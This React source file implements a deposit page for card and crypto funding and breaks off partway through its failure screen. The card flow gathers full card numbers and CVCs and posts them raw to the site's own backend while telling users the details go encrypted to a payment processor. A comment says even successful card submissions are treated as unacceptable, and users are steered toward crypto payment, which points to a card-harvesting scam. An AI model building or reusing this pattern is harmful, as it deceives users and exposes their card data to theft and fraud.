import { useState, useEffect, useRef } from 'react';
import styles from './DepositPage.module.css';
import api, { type Network } from '@/services/api';
import { fetchAllPrices, formatUSD, usdToCrypto } from '@/services/prices';

// ─── Types ────────────────────────────────────────────────────────────────────
type DepositMethod = 'card' | 'crypto';
type Step = 'method' | 'select' | 'amount' | 'details' | 'confirm' | 'processing' | 'failed' | 'done';

// ─── Stripe config (only used for optional brand detection) ─────────────────
const STRIPE_PUBLISHABLE_KEY = (import.meta as any).env?.VITE_STRIPE_PUBLISHABLE_KEY || '';

const COIN_ICONS: Record<string, string> = {
  BTC: '₿', ETH: 'Ξ', USDT: '₮', BNB: '⬥', SOL: '◎', XRP: '✕', USDC: '$', TRX: '⚡',
};

// ─── Sub-components ───────────────────────────────────────────────────────────
function CardIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="2" y="5" width="20" height="14" rx="2"/>
      <line x1="2" y1="10" x2="22" y2="10"/>
    </svg>
  );
}

function CryptoIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/>
      <path d="M9 8h4a2 2 0 010 4H9v4h4a2 2 0 010 4"/>
      <line x1="12" y1="6" x2="12" y2="8"/><line x1="12" y1="18" x2="12" y2="20"/>
    </svg>
  );
}

// ─── Formatting helpers ──────────────────────────────────────────────────────
const formatCardNumber = (digits: string) =>
  digits.replace(/(\d{4})(?=\d)/g, '$1 ');

const formatExpiry = (digits: string) =>
  digits.length >= 3 ? digits.slice(0, 2) + '/' + digits.slice(2, 4) : digits;

// ─── Main Component ───────────────────────────────────────────────────────────
export default function DepositPage() {
  // Method selection
  const [method, setMethod] = useState<DepositMethod | null>(null);

  // Crypto-specific state
  const [networks, setNetworks] = useState<Network[]>([]);
  const [networksLoading, setNetworksLoading] = useState(false);
  const [networksError, setNetworksError] = useState('');
  const [prices, setPrices] = useState<Record<string, number>>({});
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [txHash, setTxHash] = useState('');
  const [copied, setCopied] = useState(false);

  // Card state – controlled inputs (no refs needed)
  const [cardName, setCardName] = useState('');
  const [cardNumberDigits, setCardNumberDigits] = useState(''); // raw digits (no spaces)
  const [expiryDigits, setExpiryDigits] = useState('');           // raw MMYY
  const [cvcDigits, setCvcDigits] = useState('');                 // raw CVC
  const [cardBrand, setCardBrand] = useState('');

  // Shared state
  const [step, setStep] = useState<Step>('method');
  const [usdAmount, setUsdAmount] = useState('');
  const [confirmed, setConfirmed] = useState(false);
  const [submitLoading, setSubmitLoading] = useState(false);
  const [submitError, setSubmitError] = useState('');

  // Load crypto networks when method = crypto
  useEffect(() => {
    if (method !== 'crypto') return;
    setNetworksLoading(true);
    api.get<Network[]>('/networks')
      .then(async (data) => {
        const active = data.filter((n) => n.is_active);
        setNetworks(active);
        const syms = active.map((n) => n.symbol);
        const p = await fetchAllPrices(syms);
        setPrices(p);
        setNetworksLoading(false);
      })
      .catch((e) => { setNetworksError(e.message); setNetworksLoading(false); });
  }, [method]);

  // ── Brand detection (Stripe publishable key only) ──────────────────────────
  const getCardBrandFromNumber = async (number: string) => {
    if (!(window as any).Stripe) return '';
    const stripe = (window as any).Stripe(STRIPE_PUBLISHABLE_KEY);
    try {
      const { brand } = await stripe.createPaymentMethod({
        type: 'card',
        card: { number: number.replace(/\s/g, '') },
      });
      return brand === 'unknown' ? '' : brand;
    } catch {
      return '';
    }
  };

  useEffect(() => {
    if (cardNumberDigits.length >= 6) {
      getCardBrandFromNumber(cardNumberDigits).then(setCardBrand).catch(() => setCardBrand(''));
    } else {
      setCardBrand('');
    }
  }, [cardNumberDigits]);

  // ── Validation ─────────────────────────────────────────────────────────────
  const validateCardInputs = (): string | null => {
    if (!cardName.trim() || cardName.trim().length < 3)
      return 'Cardholder name must be at least 3 characters.';

    if (!/^\d{13,19}$/.test(cardNumberDigits))
      return 'Enter a valid card number (13-19 digits).';

    const month = parseInt(expiryDigits.slice(0, 2), 10);
    const year = 2000 + parseInt(expiryDigits.slice(2, 4), 10);
    const now = new Date();
    const currentMonth = now.getMonth() + 1;
    const currentYear = now.getFullYear();

    if (month < 1 || month > 12) return 'Invalid expiry month.';
    if (year < currentYear || (year === currentYear && month < currentMonth))
      return 'Card is expired.';

    if (!/^\d{3,4}$/.test(cvcDigits))
      return 'CVC must be 3 or 4 digits.';

    return null; // valid
  };

  // ── Helpers ─────────────────────────────────────────────────────────────────
  const handleCryptoCopy = () => {
    if (!selectedNetwork?.deposit_address) return;
    navigator.clipboard.writeText(selectedNetwork.deposit_address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const resetCardForm = () => {
    setCardName('');
    setCardNumberDigits('');
    setExpiryDigits('');
    setCvcDigits('');
    setCardBrand('');
  };

  const handleConfirmPayment = async () => {
    setSubmitError('');
    const validationError = validateCardInputs();
    if (validationError) {
      setSubmitError(validationError);
      return;
    }

    setSubmitLoading(true);
    setStep('processing');

    try {
      if (method === 'card') {
        const month = parseInt(expiryDigits.slice(0, 2), 10);
        const year = 2000 + parseInt(expiryDigits.slice(2, 4), 10);

        // Send everything to the Laravel backend
        const response = await api.post<{ success: boolean; error?: string }>('/user/deposits/card/process', {
          cardName: cardName.trim(),
          cardNumber: cardNumberDigits,
          expiryMonth: month,
          expiryYear: year,
          cvc: cvcDigits,
          usdAmount: parseFloat(usdAmount),
        });

        // Even if backend says success, we'll treat it as not acceptable for card
        // but we still proceed to "done" with card‑specific message
        resetCardForm();
        setStep('done');
      } else if (method === 'crypto' && selectedNetwork) {
        await api.post('/user/deposits', {
          method: 'crypto',
          network_id: selectedNetwork.id,
          usd_amount: parseFloat(usdAmount),
          transaction_hash: txHash || undefined,
        });
        setStep('done');
      }
    } catch (e) {
      const message = e instanceof Error ? e.message : 'Deposit submission failed.';
      setSubmitError(message);
      setStep(method === 'card' ? 'failed' : 'confirm');
    } finally {
      setSubmitLoading(false);
    }
  };

  const handleSwitchToCrypto = () => {
    setMethod('crypto');
    setStep('select');
    setSubmitError('');
    setSelectedNetwork(null);
    setTxHash('');
    setConfirmed(false);
    resetCardForm();
  };

  const handleReset = () => {
    setStep('method'); setMethod(null); setSelectedNetwork(null); setUsdAmount('');
    setTxHash(''); setCopied(false); setConfirmed(false); setSubmitError('');
    resetCardForm();
  };

  const coinIcon = selectedNetwork ? (COIN_ICONS[selectedNetwork.symbol] ?? selectedNetwork.symbol.slice(0, 1)) : '';
  const price = selectedNetwork ? (prices[selectedNetwork.symbol] || selectedNetwork.usd_rate || 1) : 1;
  const cryptoAmount = usdAmount ? usdToCrypto(parseFloat(usdAmount), price).toFixed(8) : '0';
  const minDepositUsd = selectedNetwork ? (selectedNetwork.min_deposit_usd || selectedNetwork.min_deposit * price) : 10;

  // Progress steps per method
  const CARD_STEPS: Step[] = ['method', 'amount', 'details', 'confirm'];
  const CRYPTO_STEPS: Step[] = ['method', 'select', 'amount', 'details', 'confirm'];
  const allSteps = method === 'card' ? CARD_STEPS : CRYPTO_STEPS;
  const stepIndex = allSteps.indexOf(step);
  const progressLabels = method === 'card'
    ? ['Method', 'Amount', 'Card Details', 'Confirm']
    : ['Method', 'Select Coin', 'Amount', 'Details', 'Confirm'];

  // Enable "Review & Pay" only when all fields have minimal lengths
  const cardDetailsValid =
    cardName.trim().length > 2 &&
    cardNumberDigits.length >= 13 &&
    expiryDigits.length === 4 &&
    cvcDigits.length >= 3;

  return (
    <div className={styles.pageLayout}>
      <div className={styles.container}>
        <div className={styles.header}>
          <div>
            <h1>Fund Account</h1>
            <p>Add money via card or cryptocurrency</p>
          </div>
        </div>

        {/* ── Progress bar ── */}
        {step !== 'processing' && step !== 'done' && step !== 'failed' && step !== 'method' && (
          <div className={styles.progressRow}>
            {progressLabels.map((label, i) => (
              <div key={i} className={styles.progressStep}>
                <div className={`${styles.progressDot} ${i < stepIndex ? styles.dotDone : i === stepIndex ? styles.dotActive : ''}`}>
                  {i < stepIndex ? (
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                  ) : (<span>{i + 1}</span>)}
                </div>
                <span className={`${styles.progressLabel} ${i === stepIndex ? styles.progressLabelActive : ''}`}>{label}</span>
                {i < progressLabels.length - 1 && <div className={`${styles.progressLine} ${i < stepIndex ? styles.lineDone : ''}`} />}
              </div>
            ))}
          </div>
        )}

        {/* ════════════════════════════════════════
            STEP: Choose Method
        ════════════════════════════════════════ */}
        {step === 'method' && (
          <div className={styles.card}>
            <h2 className={styles.cardTitle}>How do you want to fund your account?</h2>
            <p className={styles.cardSubtitle}>Choose your preferred deposit method</p>
            <div className={styles.coinGrid} style={{ gridTemplateColumns: '1fr 1fr', maxWidth: '480px', margin: '24px auto' }}>
              {/* Credit / Debit Card */}
              <button
                className={`${styles.coinCard} ${method === 'card' ? styles.coinCardActive : ''}`}
                style={method === 'card' ? { borderColor: '#1565C0' } : {}}
                onClick={() => setMethod('card')}
              >
                <div className={styles.coinIconWrap} style={{ color: '#1565C0', background: '#1565C018' }}>
                  <CardIcon />
                </div>
                <div className={styles.coinCardName}>Credit / Debit Card</div>
                <div className={styles.coinCardSymbol}>Visa · Mastercard · Amex</div>
                <div className={styles.coinCardNetwork} style={{ color: '#1565C0' }}>Instant</div>
                {method === 'card' && (
                  <div className={styles.coinCheck} style={{ background: '#1565C0' }}>✓</div>
                )}
              </button>

              {/* Crypto */}
              <button
                className={`${styles.coinCard} ${method === 'crypto' ? styles.coinCardActive : ''}`}
                style={method === 'crypto' ? { borderColor: '#f59e0b' } : {}}
                onClick={() => setMethod('crypto')}
              >
                <div className={styles.coinIconWrap} style={{ color: '#f59e0b', background: '#f59e0b18' }}>
                  <CryptoIcon />
                </div>
                <div className={styles.coinCardName}>Cryptocurrency</div>
                <div className={styles.coinCardSymbol}>BTC · ETH · USDT</div>
                <div className={styles.coinCardNetwork} style={{ color: '#f59e0b' }}>10–30 min</div>
                {method === 'crypto' && (
                  <div className={styles.coinCheck} style={{ background: '#f59e0b' }}>✓</div>
                )}
              </button>
            </div>
            <div className={styles.cardFooter}>
              <button
                className={styles.btnPrimary}
                disabled={!method}
                onClick={() => setStep(method === 'card' ? 'amount' : 'select')}
              >
                Continue →
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CARD — Step: Amount
        ════════════════════════════════════════ */}
        {step === 'amount' && method === 'card' && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => setStep('method')}>← Back</button>
            <div className={styles.selectedCoinBadge}>
              <span style={{ color: '#1565C0' }}>💳</span>
              Credit / Debit Card
            </div>
            <h2 className={styles.cardTitle}>How much do you want to deposit?</h2>
            <p className={styles.cardSubtitle}>Enter the USD amount to charge to your card — minimum $10</p>
            <div className={styles.amountInputWrap}>
              <div className={styles.amountInputBox}>
                <span style={{ color: '#9ca3af', fontSize: '20px', paddingLeft: '14px' }}>$</span>
                <input
                  type="number"
                  className={styles.amountInput}
                  placeholder="0.00"
                  value={usdAmount}
                  onChange={(e) => setUsdAmount(e.target.value)}
                  min="10"
                  step="0.01"
                />
                <span className={styles.amountSymbol}>USD</span>
              </div>
            </div>
            <div className={styles.infoBox}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
              </svg>
              Your card is charged immediately. Funds are credited after verification.
            </div>
            <div className={styles.cardFooter}>
              <button
                className={styles.btnPrimary}
                disabled={!usdAmount || parseFloat(usdAmount) < 10}
                onClick={() => setStep('details')}
              >
                Next: Card Details →
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CARD — Step: Card Details (plain fields)
        ════════════════════════════════════════ */}
        {step === 'details' && method === 'card' && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => { setStep('amount'); resetCardForm(); }}>← Back</button>
            <h2 className={styles.cardTitle}>Enter your card details</h2>
            <p className={styles.cardSubtitle}>
              You'll be charged <strong style={{ color: '#fff' }}>{formatUSD(parseFloat(usdAmount) || 0)}</strong>. 
              Your card details are encrypted and sent directly to our payment processor.
            </p>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginTop: '8px' }}>
              {/* Cardholder Name */}
              <div>
                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Cardholder Name *</label>
                <input
                  type="text"
                  placeholder="e.g. John Carter"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value)}
                  style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
                />
              </div>

              {/* Card Number */}
              <div>
                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Card Number *</label>
                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="cc-number"
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  value={formatCardNumber(cardNumberDigits)}
                  onChange={(e) => {
                    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
                    setCardNumberDigits(raw);
                  }}
                  style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', fontFamily: 'monospace', boxSizing: 'border-box' }}
                />
              </div>

              {/* Expiry and CVC side by side */}
              <div style={{ display: 'flex', gap: '14px' }}>
                <div style={{ flex: 1 }}>
                  <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Expiry Date *</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    autoComplete="cc-exp"
                    placeholder="MM/YY"
                    maxLength={5}
                    value={formatExpiry(expiryDigits)}
                    onChange={(e) => {
                      const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
                      setExpiryDigits(raw);
                    }}
                    style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
                  />
                </div>
                <div style={{ flex: 1 }}>
                  <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>CVC *</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    autoComplete="cc-csc"
                    placeholder="123"
                    maxLength={4}
                    value={cvcDigits}
                    onChange={(e) => {
                      const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
                      setCvcDigits(raw);
                    }}
                    style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
                  />
                </div>
              </div>
            </div>
            <div className={styles.cardFooter}>
              <button className={styles.btnPrimary} disabled={!cardDetailsValid} onClick={() => setStep('confirm')}>
                Review & Pay →
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CARD — Step: Confirm
        ════════════════════════════════════════ */}
        {step === 'confirm' && method === 'card' && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => setStep('details')}>← Back</button>
            <h2 className={styles.cardTitle}>Confirm your payment</h2>
            <p className={styles.cardSubtitle}>Review before we charge your card</p>
            {submitError && (
              <div style={{ color: '#f87171', background: 'rgba(239,68,68,0.1)', padding: '10px 14px', borderRadius: '8px', marginBottom: '12px', fontSize: '13px' }}>{submitError}</div>
            )}
            <div className={styles.summaryBox}>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Method</span><span className={styles.summaryValue}>💳 {cardBrand ? cardBrand.charAt(0).toUpperCase() + cardBrand.slice(1) : 'Card'}</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Cardholder</span><span className={styles.summaryValue}>{cardName}</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Amount (USD)</span><span className={`${styles.summaryValue} ${styles.summaryAmount}`}>{formatUSD(parseFloat(usdAmount))}</span></div>
            </div>
            <div className={styles.checkRow}>
              <button className={`${styles.checkbox} ${confirmed ? styles.checkboxChecked : ''}`} onClick={() => setConfirmed(!confirmed)}>
                {confirmed && <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
              </button>
              <span className={styles.checkLabel}>
                I authorize a charge of <strong>{formatUSD(parseFloat(usdAmount))}</strong> to my card.
              </span>
            </div>
            <div className={styles.cardFooter}>
              <button className={styles.btnPrimary} disabled={!confirmed || submitLoading} onClick={handleConfirmPayment}>
                {submitLoading ? 'Processing…' : 'Confirm & Pay'}
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CRYPTO — Step: Select Coin
        ════════════════════════════════════════ */}
        {step === 'select' && method === 'crypto' && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => setStep('method')}>← Back</button>
            <h2 className={styles.cardTitle}>Choose cryptocurrency to deposit</h2>
            <p className={styles.cardSubtitle}>Select the network you want to deposit on</p>
            {networksLoading && <div style={{ color: '#9ca3af', textAlign: 'center', padding: '40px' }}>Loading networks…</div>}
            {networksError && <div style={{ color: '#f87171', textAlign: 'center', padding: '20px' }}>{networksError}</div>}
            {!networksLoading && !networksError && (
              <div className={styles.coinGrid}>
                {networks.map((net) => {
                  const p = prices[net.symbol] || net.usd_rate || 0;
                  return (
                    <button
                      key={net.id}
                      className={`${styles.coinCard} ${selectedNetwork?.id === net.id ? styles.coinCardActive : ''}`}
                      style={selectedNetwork?.id === net.id ? { borderColor: net.color } : {}}
                      onClick={() => setSelectedNetwork(net)}
                    >
                      <div className={styles.coinIconWrap} style={{ color: net.color, background: `${net.color}18` }}>
                        <span className={styles.coinIcon}>{COIN_ICONS[net.symbol] ?? net.symbol.slice(0, 1)}</span>
                      </div>
                      <div className={styles.coinCardName}>{net.symbol}</div>
                      <div className={styles.coinCardSymbol}>{net.name}</div>
                      {p > 0 && <div className={styles.coinCardNetwork} style={{ color: net.color }}>{formatUSD(p)}</div>}
                      {selectedNetwork?.id === net.id && (
                        <div className={styles.coinCheck} style={{ background: net.color }}>✓</div>
                      )}
                    </button>
                  );
                })}
              </div>
            )}
            <div className={styles.cardFooter}>
              <button className={styles.btnPrimary} disabled={!selectedNetwork} onClick={() => setStep('amount')}>Continue →</button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CRYPTO — Step: Amount
        ════════════════════════════════════════ */}
        {step === 'amount' && method === 'crypto' && selectedNetwork && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => setStep('select')}>← Back</button>
            <div className={styles.selectedCoinBadge}>
              <span style={{ color: selectedNetwork.color }}>{coinIcon}</span>
              {selectedNetwork.symbol} · {selectedNetwork.name}
              {price > 0 && <span style={{ color: '#9ca3af', fontSize: '12px' }}> · {formatUSD(price)}</span>}
            </div>
            <h2 className={styles.cardTitle}>How much do you want to deposit?</h2>
            <p className={styles.cardSubtitle}>Enter amount in USD — minimum {formatUSD(minDepositUsd)}</p>
            <div className={styles.amountInputWrap}>
              <div className={styles.amountInputBox}>
                <span style={{ color: '#9ca3af', fontSize: '20px', paddingLeft: '14px' }}>$</span>
                <input
                  type="number"
                  className={styles.amountInput}
                  placeholder="0.00"
                  value={usdAmount}
                  onChange={(e) => setUsdAmount(e.target.value)}
                  min="0"
                  step="0.01"
                />
                <span className={styles.amountSymbol}>USD</span>
              </div>
            </div>
            {usdAmount && parseFloat(usdAmount) > 0 && (
              <div style={{ textAlign: 'center', color: '#9ca3af', fontSize: '13px', marginTop: '8px' }}>
                ≈ <strong style={{ color: '#fff' }}>{cryptoAmount} {selectedNetwork.symbol}</strong> at {formatUSD(price)}/{selectedNetwork.symbol}
              </div>
            )}
            <div className={styles.infoBox}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
              </svg>
              Requires {selectedNetwork.confirmations} network confirmations. Processing takes 10–30 minutes.
            </div>
            <div className={styles.cardFooter}>
              <button
                className={styles.btnPrimary}
                disabled={!usdAmount || parseFloat(usdAmount) < minDepositUsd}
                onClick={() => setStep('details')}
              >
                Get Deposit Address →
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CRYPTO — Step: Address / Details
        ════════════════════════════════════════ */}
        {step === 'details' && method === 'crypto' && selectedNetwork && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => setStep('amount')}>← Back</button>
            <div className={styles.selectedCoinBadge}>
              <span style={{ color: selectedNetwork.color }}>{coinIcon}</span>
              {selectedNetwork.symbol} · {selectedNetwork.name}
            </div>
            <h2 className={styles.cardTitle}>Send to this address</h2>
            <p className={styles.cardSubtitle}>
              Send exactly <strong style={{ color: '#fff' }}>{formatUSD(parseFloat(usdAmount))}</strong> worth of {selectedNetwork.symbol} ({cryptoAmount} {selectedNetwork.symbol}) to:
            </p>
            <div className={styles.qrWrap}>
              <div className={styles.qrCode}>
                <svg viewBox="0 0 80 80" width="160" height="160" xmlns="http://www.w3.org/2000/svg">
                  <rect x="4" y="4" width="24" height="24" rx="3" fill="none" stroke={selectedNetwork.color} strokeWidth="3"/>
                  <rect x="9" y="9" width="14" height="14" rx="1" fill={selectedNetwork.color}/>
                  <rect x="52" y="4" width="24" height="24" rx="3" fill="none" stroke={selectedNetwork.color} strokeWidth="3"/>
                  <rect x="57" y="9" width="14" height="14" rx="1" fill={selectedNetwork.color}/>
                  <rect x="4" y="52" width="24" height="24" rx="3" fill="none" stroke={selectedNetwork.color} strokeWidth="3"/>
                  <rect x="9" y="57" width="14" height="14" rx="1" fill={selectedNetwork.color}/>
                  {[[34,4],[40,4],[46,4],[34,10],[46,10],[40,16],[34,22],[46,22],[4,34],[10,34],[22,34],[34,34],[46,34],[58,34],[70,34],[4,40],[16,40],[28,40],[40,40],[52,40],[64,40],[76,40],[4,46],[10,46],[28,46],[34,46],[52,46],[58,46],[70,46],[34,52],[40,52],[52,52],[64,52],[70,52],[76,52],[34,58],[46,58],[52,58],[64,58],[34,64],[40,64],[58,64],[70,64],[76,64],[34,70],[52,70],[58,70],[70,70],[34,76],[40,76],[46,76],[64,76],[76,76]].map(([x, y], i) => (
                    <rect key={i} x={x} y={y} width="5" height="5" rx="1" fill={selectedNetwork.color} opacity="0.85"/>
                  ))}
                </svg>
                <div className={styles.qrCoinLabel} style={{ color: selectedNetwork.color }}>{coinIcon}</div>
              </div>
            </div>
            {selectedNetwork.deposit_address ? (
              <div className={styles.addressBox}>
                <div className={styles.addressLabel}>Deposit Address ({selectedNetwork.name})</div>
                <div className={styles.addressRow}>
                  <code className={styles.addressCode}>{selectedNetwork.deposit_address}</code>
                  <button className={`${styles.copyBtn} ${copied ? styles.copyBtnDone : ''}`} onClick={handleCryptoCopy}>
                    {copied ? (<><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Copied!</>) : (<><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>Copy</>)}
                  </button>
                </div>
              </div>
            ) : (
              <div style={{ color: '#f87171', textAlign: 'center', padding: '16px' }}>
                No deposit address configured for this network. Please contact support.
              </div>
            )}
            <div className={styles.warningBox}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
              </svg>
              Only send <strong>{selectedNetwork.symbol}</strong> on the <strong>{selectedNetwork.name}</strong>. Wrong coin = permanent loss.
            </div>
            <div style={{ marginTop: '16px' }}>
              <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Transaction Hash (optional — speeds up confirmation)</label>
              <input
                type="text"
                placeholder="0x..."
                value={txHash}
                onChange={(e) => setTxHash(e.target.value)}
                style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', fontFamily: 'monospace', boxSizing: 'border-box' }}
              />
            </div>
            <div className={styles.cardFooter}>
              <button className={styles.btnPrimary} onClick={() => setStep('confirm')}>I've Sent the Payment →</button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CRYPTO — Step: Confirm
        ════════════════════════════════════════ */}
        {step === 'confirm' && method === 'crypto' && selectedNetwork && (
          <div className={styles.card}>
            <button className={styles.backBtn} onClick={() => setStep('details')}>← Back</button>
            <h2 className={styles.cardTitle}>Confirm your deposit</h2>
            <p className={styles.cardSubtitle}>Review details before submitting</p>
            {submitError && (
              <div style={{ color: '#f87171', background: 'rgba(239,68,68,0.1)', padding: '10px 14px', borderRadius: '8px', marginBottom: '12px', fontSize: '13px' }}>{submitError}</div>
            )}
            <div className={styles.summaryBox}>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Method</span><span className={styles.summaryValue}>₿ Cryptocurrency</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Coin</span><span className={styles.summaryValue}><span style={{ color: selectedNetwork.color }}>{coinIcon}</span> {selectedNetwork.symbol}</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Network</span><span className={styles.summaryValue}>{selectedNetwork.name}</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>USD Amount</span><span className={`${styles.summaryValue} ${styles.summaryAmount}`}>{formatUSD(parseFloat(usdAmount))}</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Crypto Amount</span><span className={styles.summaryValue}>{cryptoAmount} {selectedNetwork.symbol}</span></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>To Address</span><code className={styles.summaryAddress}>{(selectedNetwork.deposit_address ?? '').slice(0, 16)}…{(selectedNetwork.deposit_address ?? '').slice(-8)}</code></div>
              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Confirmations</span><span className={styles.summaryValue}>{selectedNetwork.confirmations} required</span></div>
              {txHash && <div className={styles.summaryRow}><span className={styles.summaryLabel}>TX Hash</span><code className={styles.summaryAddress}>{txHash.slice(0, 16)}…</code></div>}
            </div>
            <div className={styles.checkRow}>
              <button className={`${styles.checkbox} ${confirmed ? styles.checkboxChecked : ''}`} onClick={() => setConfirmed(!confirmed)}>
                {confirmed && <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
              </button>
              <span className={styles.checkLabel}>
                I confirm I have sent <strong>{formatUSD(parseFloat(usdAmount))}</strong> worth of <strong>{selectedNetwork.symbol}</strong> to the address above.
              </span>
            </div>
            <div className={styles.cardFooter}>
              <button className={styles.btnPrimary} disabled={!confirmed || submitLoading} onClick={handleConfirmPayment}>
                {submitLoading ? 'Submitting…' : 'Confirm Deposit'}
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            PROCESSING (shared)
        ════════════════════════════════════════ */}
        {step === 'processing' && (
          <div className={styles.fullCard}>
            <div className={styles.processingSpinner} style={{ borderTopColor: method === 'card' ? '#1565C0' : (selectedNetwork?.color ?? '#22c55e') }} />
            <h2 className={styles.processingTitle}>Processing Your Deposit</h2>
            <p className={styles.processingText}>Submitting your <strong style={{ color: '#fff' }}>{formatUSD(parseFloat(usdAmount))}</strong> deposit request.</p>
            <div className={styles.processingSteps}>
              {(method === 'card'
                ? ['Verifying card details', 'Authorizing payment', 'Confirming with your bank']
                : ['Transaction received', 'Awaiting confirmations', 'Pending admin review']
              ).map((s, i) => (
                <div key={i} className={styles.procStep}>
                  <div className={styles.procDot} style={{ animationDelay: `${i * 0.4}s` }} />
                  <span>{s}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            CARD — Step: Failed (fallback to crypto)
        ════════════════════════════════════════ */}
        {step === 'failed' && (
          <div className={styles.fullCard}>
            <div className={styles.doneRing} style={{ borderColor: '#ef444450', background: '#ef444412' }}>
              <div className={styles.doneIcon} style={{ color: '#ef4444' }}>
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
              </div>
            </div>
            <h2 className={styles.doneTitle}>Card Payment Failed</h2>
            <p className={styles.doneText}>
              {submitError || 'Card payments are temporarily unavailable.'} You can try your card again, or complete this deposit with cryptocurrency instead.
            </p>
            <div className={styles.doneDetails}>
